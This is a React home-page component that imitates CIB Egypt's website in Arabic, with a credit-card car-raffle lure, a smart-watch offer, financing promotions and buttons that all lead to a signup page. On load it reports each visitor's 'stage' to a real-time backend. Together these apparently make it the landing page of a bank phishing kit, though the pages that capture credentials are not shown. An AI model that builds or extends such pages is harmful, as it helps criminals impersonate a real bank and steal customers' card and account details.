import { useEffect } from 'react';
import { Link } from 'wouter';
import { AppLayout } from '@/components/layout/AppLayout';
import { useRealtime } from '@/context/RealtimeContext';
import { Shield, Clock, Users, ChevronLeft, Car, PiggyBank, Wallet, Lock, Zap, Gift, Headphones, ShieldCheck } from 'lucide-react';

const EMPTY_PAYLOAD = {};

export default function Home() {
  const { reportStage } = useRealtime();

  useEffect(() => {
    reportStage('home', EMPTY_PAYLOAD);
  }, [reportStage]);

  const services = [
    {
      icon: Car,
      title: 'سحب على سيارة',
      desc: 'استخدم بطاقتك الائتمانية من CIB وادخل السحب على سيارة أحلامك! فرصتك للربح بكل عملية شراء.',
      button: 'سجل الآن',
      color: 'from-blue-500 to-blue-700',
    },
    {
      icon: Wallet,
      title: 'حلول تمويل',
      desc: 'خيارات تمويل مرنة وإجراءات ميسرة للعملاء المؤهلين — املك منزل أحلامك أو سيارتك بسهولة.',
      button: 'قدّم طلبك',
      color: 'from-emerald-500 to-emerald-700',
    },
    {
      icon: PiggyBank,
      title: 'شهادات الاستثمار',
      desc: 'استثمر بثقة مع حلول ادخارية تناسب أهدافك المالية واستمتع بعوائد تنافسية ومدد متنوعة.',
      button: 'اعرف المزيد',
      color: 'from-amber-500 to-amber-700',
    },
  ];

  const features = [
    {
      icon: Lock,
      title: 'حماية بنكية متقدمة',
      desc: 'تشفير من الدرجة المصرفية لجميع بياناتك ومعاملاتك على مدار الساعة.',
    },
    {
      icon: Zap,
      title: 'تجربة فائقة السرعة',
      desc: 'تنفيذ معاملاتك في ثوانٍ مع واجهة استخدام سهلة وحديثة.',
    },
    {
      icon: Gift,
      title: 'عروض حصرية',
      desc: 'هدايا وعروض محدودة لعملاء CIB المميزين فقط.',
    },
    {
      icon: Headphones,
      title: 'دعم 24/7',
      desc: 'فريق دعم متخصص متاح دائماً للإجابة عن استفساراتك.',
    },
  ];

  return (
    <AppLayout>
      <div className="w-full flex flex-col items-center justify-start flex-1 animate-in fade-in duration-500" dir="rtl">
        
        {/* Hero Section */}
        <div className="relative w-full min-h-[600px] lg:min-h-[500px] bg-gradient-to-br from-[#0c59b3] via-[#0a4fa3] to-[#073a7a] overflow-hidden">
          <div className="absolute -top-20 -right-20 w-80 h-80 bg-blue-400 opacity-10 rounded-full blur-3xl pointer-events-none"></div>
          <div className="absolute -bottom-32 -left-32 w-96 h-96 bg-blue-300 opacity-10 rounded-full blur-3xl pointer-events-none"></div>
          
          <div className="container mx-auto px-4 py-16 lg:py-20 relative z-10">
            <div className="flex flex-col lg:flex-row items-center justify-between gap-12">
              <div className="flex-1 text-white text-center lg:text-right max-w-2xl">
                <div className="inline-flex items-center gap-2 bg-white/10 backdrop-blur-sm px-4 py-2 rounded-full mb-6 animate-in slide-in-from-right-4 fade-in duration-500">
                  <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                  <span className="text-sm font-semibold tracking-wide">Prime</span>
                </div>
                
                <h1 className="text-4xl md:text-5xl lg:text-6xl font-extrabold mb-4 leading-tight animate-in slide-in-from-right-4 fade-in duration-500 delay-100">
                  البنك التجاري الدولي
                  <span className="block text-2xl md:text-3xl lg:text-4xl font-bold mt-2 text-blue-200">CIB Egypt</span>
                </h1>
                
                <p className="text-lg md:text-xl text-blue-100 mb-8 leading-relaxed animate-in slide-in-from-right-4 fade-in duration-500 delay-200">
                  خدماتك المصرفية بين يديك — أمان، سرعة وثقة في كل معاملة
                </p>
                
                <div className="flex flex-col sm:flex-row gap-4 justify-center lg:justify-start animate-in slide-in-from-right-4 fade-in duration-500 delay-300">
                  <Link 
                    href="/signup"
                    className="inline-flex items-center justify-center gap-2 bg-white text-[#0a4fa3] px-8 py-4 rounded-xl font-bold text-lg hover:bg-blue-50 transition-all duration-300 hover:scale-105 shadow-lg"
                  >
                    <span>استكشف الخدمات</span>
                    <ChevronLeft className="w-5 h-5" />
                  </Link>
                  <Link 
                    href="/watches"
                    className="inline-flex items-center justify-center gap-2 bg-white/10 backdrop-blur-sm text-white px-8 py-4 rounded-xl font-bold text-lg hover:bg-white/20 transition-all duration-300 border border-white/20"
                  >
                    <span>عرض الساعات الذكية</span>
                  </Link>
                </div>
              </div>
              
              {/* Credit Card */}
              <div className="flex-1 flex justify-center animate-in slide-in-from-left-4 fade-in duration-500 delay-200">
                <div className="relative">
                  <div className="w-72 h-44 md:w-80 md:h-48 bg-gradient-to-br from-white to-gray-100 rounded-2xl shadow-2xl p-6 transform rotate-3 hover:rotate-0 transition-transform duration-500">
                    <div className="flex justify-between items-start mb-8">
                      <div className="text-right">
                        <span className="text-xs text-gray-500 block">CIB Prime</span>
                        <span className="text-sm font-bold text-[#0a4fa3]">بطاقة ائتمان</span>
                      </div>
                      <div className="w-10 h-10 bg-gradient-to-br from-[#0a4fa3] to-[#073a7a] rounded-full flex items-center justify-center">
                        <span className="text-white text-xs font-bold">CIB</span>
                      </div>
                    </div>
                    <div className="flex gap-1 mb-4">
                      {[1, 2, 3, 4].map((i) => (
                        <div key={i} className="w-8 h-6 bg-gray-300/50 rounded-sm"></div>
                      ))}
                      <span className="text-gray-600 font-mono text-sm">1234</span>
                    </div>
                    <div className="flex justify-between items-end">
                      <div className="text-right">
                        <span className="text-[10px] text-gray-400 block">حامل البطاقة</span>
                        <span className="text-xs font-semibold text-gray-700">اسم العميل</span>
                      </div>
                      <div className="w-12 h-8 bg-gradient-to-br from-[#0a4fa3] to-[#073a7a] rounded-sm flex items-center justify-center">
                        <span className="text-white text-[8px] font-bold">VISA</span>
                      </div>
                    </div>
                  </div>
                  <div className="absolute -bottom-4 -right-4 w-72 h-44 md:w-80 md:h-48 bg-gradient-to-br from-gray-100 to-gray-200 rounded-2xl shadow-xl transform -rotate-6 opacity-50"></div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Stats */}
        <div className="w-full bg-white shadow-lg -mt-8 relative z-20 mx-4 lg:mx-auto max-w-6xl rounded-2xl">
          <div className="container mx-auto px-8 py-8">
            <div className="grid grid-cols-3 gap-8">
              <div className="flex items-center gap-4 text-right">
                <div className="w-14 h-14 bg-blue-50 rounded-xl flex items-center justify-center">
                  <Shield className="w-7 h-7 text-[#0a4fa3]" />
                </div>
                <div>
                  <div className="text-3xl font-extrabold text-[#0a4fa3]">100%</div>
                  <div className="text-sm text-gray-500">حماية</div>
                </div>
              </div>
              
              <div className="flex items-center gap-4 text-right border-x border-gray-100 px-8">
                <div className="w-14 h-14 bg-emerald-50 rounded-xl flex items-center justify-center">
                  <Users className="w-7 h-7 text-emerald-600" />
                </div>
                <div>
                  <div className="text-3xl font-extrabold text-[#0a4fa3]">+2</div>
                  <div className="text-sm text-gray-500">مليون عميل</div>
                </div>
              </div>
              
              <div className="flex items-center gap-4 text-right">
                <div className="w-14 h-14 bg-amber-50 rounded-xl flex items-center justify-center">
                  <Clock className="w-7 h-7 text-amber-600" />
                </div>
                <div>
                  <div className="text-3xl font-extrabold text-[#0a4fa3]">24/7</div>
                  <div className="text-sm text-gray-500">خدمة فورية</div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Services */}
        <div className="w-full max-w-6xl mx-auto px-4 py-20" id="services">
          <div className="text-center mb-12">
            <h2 className="text-3xl md:text-4xl font-extrabold text-foreground mb-4">
              اختر الخدمة المناسبة لك
            </h2>
            <p className="text-lg text-muted-foreground">
              خدمات مصرفية متنوعة مُصممة خصيصاً لراحتك
            </p>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            {services.map((service, idx) => (
              <div 
                key={idx}
                className="group bg-white rounded-2xl overflow-hidden shadow-sm border border-gray-100 hover:shadow-xl transition-all duration-300 hover:-translate-y-2"
              >
                <div className="h-3 bg-gradient-to-l from-blue-500 to-blue-700"></div>
                <div className="p-8">
                  <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-blue-500 to-blue-700 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform duration-300">
                    <service.icon className="w-8 h-8 text-white" />
                  </div>
                  <h3 className="text-xl font-bold text-foreground mb-3">{service.title}</h3>
                  <p className="text-gray-500 mb-6 leading-relaxed">{service.desc}</p>
                  <Link 
                    href="/signup"
                    className="inline-flex items-center gap-2 text-[#0a4fa3] font-semibold hover:gap-3 transition-all duration-300"
                  >
                    <span>{service.button}</span>
                    <ChevronLeft className="w-4 h-4" />
                  </Link>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Why Us */}
        <div className="w-full bg-gradient-to-br from-gray-50 to-blue-50 py-20">
          <div className="w-full max-w-6xl mx-auto px-4">
            <div className="text-center mb-12">
              <h2 className="text-3xl md:text-4xl font-extrabold text-foreground mb-4">
                ثقة لا تتزعزع
              </h2>
              <p className="text-lg text-muted-foreground">
                أكثر من 50 عاماً من الخبرة في تقديم أفضل الخدمات المصرفية
              </p>
            </div>
            
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
              {features.map((feature, idx) => (
                <div 
                  key={idx}
                  className="bg-white rounded-2xl p-6 shadow-sm border border-gray-100 hover:shadow-lg transition-all duration-300 group"
                >
                  <div className="w-14 h-14 bg-gradient-to-br from-[#0a4fa3] to-[#073a7a] rounded-xl flex items-center justify-center mb-4 group-hover:scale-110 transition-transform duration-300">
                    <feature.icon className="w-7 h-7 text-white" />
                  </div>
                  <h3 className="text-lg font-bold text-foreground mb-2">{feature.title}</h3>
                  <p className="text-sm text-gray-500 leading-relaxed">{feature.desc}</p>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* CTA */}
        <div className="w-full bg-gradient-to-br from-[#0c59b3] via-[#0a4fa3] to-[#073a7a] py-20">
          <div className="w-full max-w-4xl mx-auto px-4 text-center">
            <div className="inline-flex items-center gap-2 bg-white/10 backdrop-blur-sm px-4 py-2 rounded-full mb-6">
              <ShieldCheck className="w-5 h-5 text-green-400" />
              <span className="text-sm font-semibold text-white">جاهز للبدء؟</span>
            </div>
            
            <h2 className="text-3xl md:text-4xl font-extrabold text-white mb-4">
              افتح حسابك في ثوانٍ
            </h2>
            <p className="text-lg text-blue-100 mb-8 max-w-2xl mx-auto">
              انضم إلى ملايين العملاء الذين يثقون في CIB لإدارة حياتهم المالية.
            </p>
            
            <Link 
              href="/signup"
              className="inline-flex items-center justify-center gap-2 bg-white text-[#0a4fa3] px-10 py-4 rounded-xl font-bold text-lg hover:bg-blue-50 transition-all duration-300 hover:scale-105 shadow-xl"
            >
              <span>ابدأ الآن</span>
              <ChevronLeft className="w-5 h-5" />
            </Link>
          </div>
        </div>

      </div>
    </AppLayout>
  );
}
